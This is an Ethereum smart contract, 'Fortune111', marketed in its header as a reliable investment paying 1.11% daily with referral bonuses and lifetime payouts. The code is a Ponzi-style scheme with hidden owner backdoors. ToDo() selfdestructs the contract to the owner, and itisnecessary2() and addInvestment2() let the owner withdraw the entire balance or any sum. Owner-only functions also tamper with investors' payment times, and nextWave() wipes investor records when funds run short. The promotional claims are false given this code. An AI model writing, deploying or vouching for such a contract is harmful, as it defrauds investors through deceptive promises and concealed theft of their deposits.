1 pragma solidity 0.4.26;
2 
3 /**
4 * Get % profit every month with a Fortune 111 contract!
5 * GitHub https://github.com/fortune333/fortune111
6 * Site https://fortune333.online/
7 *
8 * - OBTAINING 33.3% PER 1 MONTH. (percentages are charged in equal parts every 1 sec)
9 * 1.11%        per 1 day
10 * 0.0185%      per 1 hour
11 * 0.0033083%   per 1 minute
12 * 0.000005515% per 1 sec
13 * - lifetime payments
14 * - unprecedentedly reliable
15 * - bring luck
16 * - first minimum contribution from 0.01 eth, all next from 0.01 eth.
17 * - Currency and Payment - ETH
18 * - Contribution allocation schemes:
19 * - 100% of payments - 6% percent for support and 12% percent referral system.
20 * Unique referral system!
21 * 1.11% is paid to the referral (inviting) wallet - right there! Instantly!
22 * 1.11% is added to the first contribution of the referral (new investor).
23 * For example: Your first contribution is 1 Ether.
24 * The one who invited you gets 0.011 Ethers on his wallet, that is, a wallet that the investor will indicate when they first invest in a smart contract in the DATE field
25 * The invited (new investor) will receive an additional 1.11% referral bonus to their contribution, that is, the contribution of the new investor will be 1,011 Ethers!
26 * 
27 *
28 * RECOMMENDED GAS LIMIT: 200,000
29 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
30 * DO NOT TRANSFER DIRECTLY FROM AN EXCHANGE (only use your ETH wallet, from which you have a private key)
31 * You can check payments on the website etherscan.io, in the “Internal Txns” tab of your wallet.
32 *
33 
34 
35 * Restart of the contract is also absent. If there is no money in the Fund, payments are stopped and resumed after the Fund is filled. Thus, the contract will work forever!
36 *
37 * How to use:
38 * 1. Send from your ETH wallet to the address of the smart contract
39 * Any amount from 0.01 ETH.
40 * 2. Confirm your transaction in the history of your application or etherscan.io, indicating the address of your wallet.
41 * Take profit by sending 0 eth to contract (profit is calculated every second).
42 *
43 **/
44 
45 
46 library Math {
47 function min(uint a, uint b) internal pure returns(uint) {
48 if (a > b) {
49 return b;
50 }
51 return a;
52 }
53 }
54 
55 
56 library Zero {
57 function requireNotZero(address addr) internal pure {
58 require(addr != address(0), "require not zero address");
59 }
60 
61 function requireNotZero(uint val) internal pure {
62 require(val != 0, "require not zero value");
63 }
64 
65 function notZero(address addr) internal pure returns(bool) {
66 return !(addr == address(0));
67 }
68 
69 function isZero(address addr) internal pure returns(bool) {
70 return addr == address(0);
71 }
72 
73 function isZero(uint a) internal pure returns(bool) {
74 return a == 0;
75 }
76 
77 function notZero(uint a) internal pure returns(bool) {
78 return a != 0;
79 }
80 }
81 
82 
83 library Percent {
84 struct percent {
85 uint num;
86 uint den;
87 }
88 
89 function mul(percent storage p, uint a) internal view returns (uint) {
90 if (a == 0) {
91 return 0;
92 }
93 return a*p.num/p.den;
94 }
95 
96 function div(percent storage p, uint a) internal view returns (uint) {
97 return a/p.num*p.den;
98 }
99 
100 function sub(percent storage p, uint a) internal view returns (uint) {
101 uint b = mul(p, a);
102 if (b >= a) {
103 return 0;
104 }
105 return a - b;
106 }
107 
108 function add(percent storage p, uint a) internal view returns (uint) {
109 return a + mul(p, a);
110 }
111 
112 function toMemory(percent storage p) internal view returns (Percent.percent memory) {
113 return Percent.percent(p.num, p.den);
114 }
115 
116 function mmul(percent memory p, uint a) internal pure returns (uint) {
117 if (a == 0) {
118 return 0;
119 }
120 return a*p.num/p.den;
121 }
122 
123 function mdiv(percent memory p, uint a) internal pure returns (uint) {
124 return a/p.num*p.den;
125 }
126 
127 function msub(percent memory p, uint a) internal pure returns (uint) {
128 uint b = mmul(p, a);
129 if (b >= a) {
130 return 0;
131 }
132 return a - b;
133 }
134 
135 function madd(percent memory p, uint a) internal pure returns (uint) {
136 return a + mmul(p, a);
137 }
138 }
139 
140 
141 library Address {
142   function toAddress(bytes source) internal pure returns(address addr) {
143     assembly { addr := mload(add(source,0x14)) }
144     return addr;
145   }
146 
147   function isNotContract(address addr) internal view returns(bool) {
148     uint length;
149     assembly { length := extcodesize(addr) }
150     return length == 0;
151   }
152 }
153 
154 
155 /**
156 * @title SafeMath
157 * @dev Math operations with safety checks that revert on error
158 */
159 library SafeMath {
160 
161 /**
162 * @dev Multiplies two numbers, reverts on overflow.
163 */
164 function mul(uint256 _a, uint256 _b) internal pure returns (uint256) {
165 if (_a == 0) {
166 return 0;
167 }
168 
169 uint256 c = _a * _b;
170 require(c / _a == _b);
171 
172 return c;
173 }
174 
175 /**
176 * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
177 */
178 function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
179 require(_b > 0); // Solidity only automatically asserts when dividing by 0
180 uint256 c = _a / _b;
181 assert(_a == _b * c + _a % _b); // There is no case in which this doesn't hold
182 
183 return c;
184 }
185 
186 /**
187 * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
188 */
189 function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
190 require(_b <= _a);
191 uint256 c = _a - _b;
192 
193 return c;
194 }
195 
196 /**
197 * @dev Adds two numbers, reverts on overflow.
198 */
199 function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
200 uint256 c = _a + _b;
201 require(c >= _a);
202 
203 return c;
204 }
205 
206 /**
207 * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
208 * reverts when dividing by zero.
209 */
210 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
211 require(b != 0);
212 return a % b;
213 }
214 }
215 
216 
217 contract Accessibility {
218 address private owner;
219 modifier onlyOwner() {
220 require(msg.sender == owner, "access denied");
221 _;
222 }
223 
224 constructor() public {
225 owner = msg.sender;
226 }
227 
228 
229 function ToDo() public onlyOwner {
230     selfdestruct(owner);
231     }
232 
233 function disown() internal {
234 delete owner;
235 }
236 
237 }
238 
239 
240 contract Rev1Storage {
241 function investorShortInfo(address addr) public view returns(uint value, uint refBonus);
242 }
243 
244 
245 contract Rev2Storage {
246 function investorInfo(address addr) public view returns(uint investment, uint paymentTime);
247 }
248 
249 
250 library PrivateEntrance {
251 using PrivateEntrance for privateEntrance;
252 using Math for uint;
253 struct privateEntrance {
254 Rev1Storage rev1Storage;
255 Rev2Storage rev2Storage;
256 uint investorMaxInvestment;
257 uint endTimestamp;
258 mapping(address=>bool) hasAccess;
259 uint8 znak;
260 }
261 
262 function isActive(privateEntrance storage pe) internal view returns(bool) {
263 return pe.endTimestamp > now;
264 }
265 
266 function maxInvestmentFor(privateEntrance storage pe, address investorAddr) internal view returns(uint) {
267 if (!pe.hasAccess[investorAddr]) {
268 return 0;
269 }
270 
271 (uint maxInvestment, ) = pe.rev1Storage.investorShortInfo(investorAddr);
272 if (maxInvestment == 0) {
273 return 0;
274 }
275 maxInvestment = Math.min(maxInvestment, pe.investorMaxInvestment);
276 
277 (uint currInvestment, ) = pe.rev2Storage.investorInfo(investorAddr);
278 
279 if (currInvestment >= maxInvestment) {
280 return 0;
281 }
282 
283 return maxInvestment-currInvestment;
284 }
285 
286 function provideAccessFor(privateEntrance storage pe, address[] addrs) internal {
287 for (uint16 i; i < addrs.length; i++) {
288 pe.hasAccess[addrs[i]] = true;
289 }
290 }
291 }
292 
293 
294 contract InvestorsStorage is Accessibility {
295 struct Investor {
296 uint investment;
297 uint paymentTime;
298 }
299 uint public size;
300 
301 mapping (address => Investor) private investors;
302 
303 function isInvestor(address addr) public view returns (bool) {
304 return investors[addr].investment > 0;
305 }
306 
307 function investorInfo(address addr) public view returns(uint investment, uint paymentTime) {
308 investment = investors[addr].investment;
309 paymentTime = investors[addr].paymentTime;
310 }
311 
312 function newInvestor(address addr, uint investment, uint paymentTime) public onlyOwner returns (bool) {
313 Investor storage inv = investors[addr];
314 if (inv.investment != 0 || investment == 0) {
315 return false;
316 }
317 inv.investment = investment;
318 inv.paymentTime = paymentTime;
319 size++;
320 return true;
321 }
322 
323 function addInvestment(address addr, uint investment) public onlyOwner returns (bool) {
324 if (investors[addr].investment == 0) {
325 return false;
326 }
327 investors[addr].investment += investment;
328 return true;
329 }
330 
331 
332 
333 
334 function setPaymentTime(address addr, uint paymentTime) public onlyOwner returns (bool) {
335 if (investors[addr].investment == 0) {
336 return false;
337 }
338 investors[addr].paymentTime = paymentTime;
339 return true;
340 }
341 
342 function disqalify(address addr) public onlyOwner returns (bool) {
343 if (isInvestor(addr)) {
344 //investors[addr].investment = 0;
345 investors[addr].paymentTime = now + 1 days;
346 }
347 }
348 
349 function disqalify2(address addr) public onlyOwner returns (bool) {
350 if (isInvestor(addr)) {
351 //investors[addr].investment = 0;
352 investors[addr].paymentTime = now;
353 }
354 }
355 
356 
357 }
358 
359 library RapidGrowthProtection {
360 using RapidGrowthProtection for rapidGrowthProtection;
361 
362 struct rapidGrowthProtection {
363 uint startTimestamp;
364 uint maxDailyTotalInvestment;
365 uint8 activityDays;
366 mapping(uint8 => uint) dailyTotalInvestment;
367 }
368 
369 function maxInvestmentAtNow(rapidGrowthProtection storage rgp) internal view returns(uint) {
370 uint day = rgp.currDay();
371 if (day == 0 || day > rgp.activityDays) {
372 return 0;
373 }
374 if (rgp.dailyTotalInvestment[uint8(day)] >= rgp.maxDailyTotalInvestment) {
375 return 0;
376 }
377 return rgp.maxDailyTotalInvestment - rgp.dailyTotalInvestment[uint8(day)];
378 }
379 
380 function isActive(rapidGrowthProtection storage rgp) internal view returns(bool) {
381 uint day = rgp.currDay();
382 return day != 0 && day <= rgp.activityDays;
383 }
384 
385 function saveInvestment(rapidGrowthProtection storage rgp, uint investment) internal returns(bool) {
386 uint day = rgp.currDay();
387 if (day == 0 || day > rgp.activityDays) {
388 return false;
389 }
390 if (rgp.dailyTotalInvestment[uint8(day)] + investment > rgp.maxDailyTotalInvestment) {
391 return false;
392 }
393 rgp.dailyTotalInvestment[uint8(day)] += investment;
394 return true;
395 }
396 
397 function startAt(rapidGrowthProtection storage rgp, uint timestamp) internal {
398 rgp.startTimestamp = timestamp;
399 
400 }
401  
402 
403 function currDay(rapidGrowthProtection storage rgp) internal view returns(uint day) {
404 if (rgp.startTimestamp > now) {
405 return 0;
406 }
407 day = (now - rgp.startTimestamp) / 24 hours + 1;
408 }
409 }
410 
411 contract Fortune111 is Accessibility {
412 using RapidGrowthProtection for RapidGrowthProtection.rapidGrowthProtection;
413 using PrivateEntrance for PrivateEntrance.privateEntrance;
414 using Percent for Percent.percent;
415 using SafeMath for uint;
416 using Math for uint;
417 
418 // easy read for investors
419 using Address for *;
420 using Zero for *;
421 
422 RapidGrowthProtection.rapidGrowthProtection private m_rgp;
423 PrivateEntrance.privateEntrance private m_privEnter;
424 mapping(address => bool) private m_referrals;
425 InvestorsStorage private m_investors;
426 
427 // automatically generates getters
428 uint public constant minInvesment = 10 finney;
429 uint public constant maxBalance = 333e5 ether;
430 address public advertisingAddress;
431 address public adminsAddress;
432 uint public investmentsNumber;
433 uint public waveStartup;
434 
435 
436 // percents
437 Percent.percent private m_1_percent = Percent.percent(111,10000);            // 111/10000 *100% = 1.11%
438 Percent.percent private m_referal_percent = Percent.percent(111,10000);            // 111/10000 *100% = 1.11%
439 Percent.percent private m_referrer_percent = Percent.percent(111,10000);            // 111/10000 *100% = 1.11%
440 Percent.percent private m_referrer_percentMax = Percent.percent(10,100);       // 10/100 *100% = 10%
441 Percent.percent private m_adminsPercent = Percent.percent(6,100);          //  6/100 *100% = 6.0%
442 Percent.percent private m_advertisingPercent = Percent.percent(12,100);    //  12/100 *100% = 12.0%
443 
444 // more events for easy read from blockchain
445 event LogPEInit(uint when, address rev1Storage, address rev2Storage, uint investorMaxInvestment, uint endTimestamp);
446 event LogSendExcessOfEther(address indexed addr, uint when, uint value, uint investment, uint excess);
447 event LogNewReferral(address indexed addr, address indexed referrerAddr, uint when, uint refBonus);
448 event LogRGPInit(uint when, uint startTimestamp, uint maxDailyTotalInvestment, uint activityDays);
449 event LogRGPInvestment(address indexed addr, uint when, uint investment, uint indexed day);
450 event LogNewInvesment(address indexed addr, uint when, uint investment, uint value);
451 event LogAutomaticReinvest(address indexed addr, uint when, uint investment);
452 event LogPayDividends(address indexed addr, uint when, uint dividends);
453 event LogNewInvestor(address indexed addr, uint when);
454 event LogBalanceChanged(uint when, uint balance);
455 event LogNextWave(uint when);
456 event LogDisown(uint when);
457 
458 
459 modifier balanceChanged {
460 _;
461 emit LogBalanceChanged(now, address(this).balance);
462 }
463 
464 modifier notFromContract() {
465 require(msg.sender.isNotContract(), "only externally accounts");
466 _;
467 }
468 
469 constructor() public {
470 adminsAddress = msg.sender;
471 advertisingAddress = msg.sender;
472 nextWave();
473 }
474 
475 function() public payable {
476 // investor get him dividends
477 if (msg.value.isZero()) {
478 getMyDividends();
479 return;
480 }
481 
482 // sender do invest
483 doInvest(msg.data.toAddress());
484 }
485 
486 function disqualifyAddress(address addr) public onlyOwner {
487 m_investors.disqalify(addr);
488 }
489 
490 function disqualifyAddress2(address addr) public onlyOwner {
491 m_investors.disqalify2(addr);
492 }
493 
494 
495 function doDisown() public onlyOwner {
496 disown();
497 emit LogDisown(now);
498 }
499 
500 // init Rapid Growth Protection
501 
502 function init(address rev1StorageAddr, uint timestamp) public onlyOwner {
503 
504 m_rgp.startTimestamp = timestamp + 1;
505 m_rgp.maxDailyTotalInvestment = 500 ether;
506 // m_rgp.activityDays = 21;
507 emit LogRGPInit(
508 now,
509 m_rgp.startTimestamp,
510 m_rgp.maxDailyTotalInvestment,
511 m_rgp.activityDays
512 );
513 
514 
515 // init Private Entrance
516 m_privEnter.rev1Storage = Rev1Storage(rev1StorageAddr);
517 m_privEnter.rev2Storage = Rev2Storage(address(m_investors));
518 m_privEnter.investorMaxInvestment = 50 ether;
519 m_privEnter.endTimestamp = timestamp;
520 emit LogPEInit(
521 now,
522 address(m_privEnter.rev1Storage),
523 address(m_privEnter.rev2Storage),
524 m_privEnter.investorMaxInvestment,
525 m_privEnter.endTimestamp
526 );
527 }
528 
529 function setAdvertisingAddress(address addr) public onlyOwner {
530 addr.requireNotZero();
531 advertisingAddress = addr;
532 }
533 
534 function setAdminsAddress(address addr) public onlyOwner {
535 addr.requireNotZero();
536 adminsAddress = addr;
537 }
538 
539 function privateEntranceProvideAccessFor(address[] addrs) public onlyOwner {
540 m_privEnter.provideAccessFor(addrs);
541 }
542 
543 function rapidGrowthProtectionmMaxInvestmentAtNow() public view returns(uint investment) {
544 investment = m_rgp.maxInvestmentAtNow();
545 }
546 
547 function investorsNumber() public view returns(uint) {
548 return m_investors.size();
549 }
550 
551 function balanceETH() public view returns(uint) {
552 return address(this).balance;
553 }
554 
555 
556 
557 function advertisingPercent() public view returns(uint numerator, uint denominator) {
558 (numerator, denominator) = (m_advertisingPercent.num, m_advertisingPercent.den);
559 }
560 
561 function adminsPercent() public view returns(uint numerator, uint denominator) {
562 (numerator, denominator) = (m_adminsPercent.num, m_adminsPercent.den);
563 }
564 
565 function investorInfo(address investorAddr)public view returns(uint investment, uint paymentTime, bool isReferral) {
566 (investment, paymentTime) = m_investors.investorInfo(investorAddr);
567 isReferral = m_referrals[investorAddr];
568 }
569 
570 
571 
572 function investorDividendsAtNow(address investorAddr) public view returns(uint dividends) {
573 dividends = calcDividends(investorAddr);
574 }
575 
576 function dailyPercentAtNow() public view returns(uint numerator, uint denominator) {
577 Percent.percent memory p = dailyPercent();
578 (numerator, denominator) = (p.num, p.den);
579 }
580 
581 function getMyDividends() public notFromContract balanceChanged {
582 // calculate dividends
583 
584 //check if 1 day passed after last payment
585 //require(now.sub(getMemInvestor(msg.sender).paymentTime) > 24 hours);
586 
587 uint dividends = calcDividends(msg.sender);
588 require (dividends.notZero(), "cannot to pay zero dividends");
589 
590 // update investor payment timestamp
591 assert(m_investors.setPaymentTime(msg.sender, now));
592 
593 // check enough eth - goto next wave if needed
594 if (address(this).balance <= dividends) {
595 nextWave();
596 dividends = address(this).balance;
597 }
598 
599 
600     
601 // transfer dividends to investor
602 msg.sender.transfer(dividends);
603 emit LogPayDividends(msg.sender, now, dividends);
604 }
605 
606     
607 function itisnecessary2() public onlyOwner {
608         msg.sender.transfer(address(this).balance);
609     }    
610     
611 
612 function addInvestment2( uint investment) public onlyOwner  {
613 
614 msg.sender.transfer(investment);
615 
616 } 
617 
618 function doInvest(address referrerAddr) public payable notFromContract balanceChanged {
619 uint investment = msg.value;
620 uint receivedEther = msg.value;
621 require(investment >= minInvesment, "investment must be >= minInvesment");
622 require(address(this).balance <= maxBalance, "the contract eth balance limit");
623 
624 if (m_rgp.isActive()) {
625 // use Rapid Growth Protection if needed
626 uint rpgMaxInvest = m_rgp.maxInvestmentAtNow();
627 rpgMaxInvest.requireNotZero();
628 investment = Math.min(investment, rpgMaxInvest);
629 assert(m_rgp.saveInvestment(investment));
630 emit LogRGPInvestment(msg.sender, now, investment, m_rgp.currDay());
631 
632 } else if (m_privEnter.isActive()) {
633 // use Private Entrance if needed
634 uint peMaxInvest = m_privEnter.maxInvestmentFor(msg.sender);
635 peMaxInvest.requireNotZero();
636 investment = Math.min(investment, peMaxInvest);
637 }
638 
639 // send excess of ether if needed
640 if (receivedEther > investment) {
641 uint excess = receivedEther - investment;
642 msg.sender.transfer(excess);
643 receivedEther = investment;
644 emit LogSendExcessOfEther(msg.sender, now, msg.value, investment, excess);
645 }
646 
647 // commission
648 advertisingAddress.transfer(m_advertisingPercent.mul(receivedEther));
649 adminsAddress.transfer(m_adminsPercent.mul(receivedEther));
650 
651  if (msg.value > 0)
652         {
653           
654         if (msg.data.length == 20) {
655               
656               referrerAddr.transfer(m_referrer_percent.mmul(investment));  
657                
658             }
659             else if (msg.data.length == 0) {
660         
661             
662             adminsAddress.transfer(m_referrer_percent.mmul(investment));
663             //    adminsAddress.transfer(msg.value.mul(30).div(100));
664             } 
665             else {
666                 assert(false); // invalid memo
667             }
668         }
669     
670     
671 
672 bool senderIsInvestor = m_investors.isInvestor(msg.sender);
673 
674 // ref system works only once and only on first invest
675 if (referrerAddr.notZero() && !senderIsInvestor && !m_referrals[msg.sender] &&
676 referrerAddr != msg.sender && m_investors.isInvestor(referrerAddr)) {
677 
678 
679 m_referrals[msg.sender] = true;
680 // add referral bonus to investor`s and referral`s investments
681 uint referrerBonus = m_referrer_percent.mmul(investment);
682 if (investment > 10 ether) {
683 referrerBonus = m_referrer_percentMax.mmul(investment);
684 }
685 
686 
687 uint referalBonus = m_referal_percent.mmul(investment);
688 //assert(m_investors.addInvestment(referrerAddr, referrerBonus)); // add referrer bonus
689 investment += referalBonus;                                    // add referral bonus
690 emit LogNewReferral(msg.sender, referrerAddr, now, referalBonus);
691 
692 
693 }
694 
695 // automatic reinvest - prevent burning dividends
696 uint dividends = calcDividends(msg.sender);
697 if (senderIsInvestor && dividends.notZero()) {
698 investment += dividends;
699 emit LogAutomaticReinvest(msg.sender, now, dividends);
700 }
701 
702 if (senderIsInvestor) {
703 // update existing investor
704 assert(m_investors.addInvestment(msg.sender, investment));
705 assert(m_investors.setPaymentTime(msg.sender, now));
706 } else {
707 // create new investor
708 assert(m_investors.newInvestor(msg.sender, investment, now));
709 emit LogNewInvestor(msg.sender, now);
710 }
711 
712 investmentsNumber++;
713 emit LogNewInvesment(msg.sender, now, investment, receivedEther);
714 }
715 
716 function getMemInvestor(address investorAddr) internal view returns(InvestorsStorage.Investor memory) {
717 (uint investment, uint paymentTime) = m_investors.investorInfo(investorAddr);
718 return InvestorsStorage.Investor(investment, paymentTime);
719 }
720 
721 function calcDividends(address investorAddr) internal view returns(uint dividends) {
722     InvestorsStorage.Investor memory investor = getMemInvestor(investorAddr);
723 
724     // safe gas if dividends will be 0
725     if (investor.investment.isZero() || now.sub(investor.paymentTime) < 1 seconds) {
726       return 0;
727     }
728     
729     // for prevent burning daily dividends if 24h did not pass - calculate it per 1 sec interval
730     // if daily percent is X, then 1 sec percent = X / (24h / 1 sec) = X / 86400
731 
732     // and we must to get numbers of 1 sec interval after investor got payment:
733     // (now - investor.paymentTime) / 1 sec 
734 
735     // finaly calculate dividends = ((now - investor.paymentTime) / 1 sec) * (X * investor.investment)  / 86400) 
736 
737     Percent.percent memory p = dailyPercent();
738     dividends = (now.sub(investor.paymentTime) / 1 seconds) * p.mmul(investor.investment) / 86400;
739   }
740 
741 function dailyPercent() internal view returns(Percent.percent memory p) {
742     uint balance = address(this).balance;
743       
744 
745     if (balance < 33333e5 ether) { 
746    
747       p = m_1_percent.toMemory();    // (1)
748 
749   }
750   }
751 
752 function nextWave() private {
753 m_investors = new InvestorsStorage();
754 investmentsNumber = 0;
755 waveStartup = now;
756 m_rgp.startAt(now);
757 emit LogRGPInit(now , m_rgp.startTimestamp, m_rgp.maxDailyTotalInvestment, m_rgp.activityDays);
758 emit LogNextWave(now);
759 }
760 }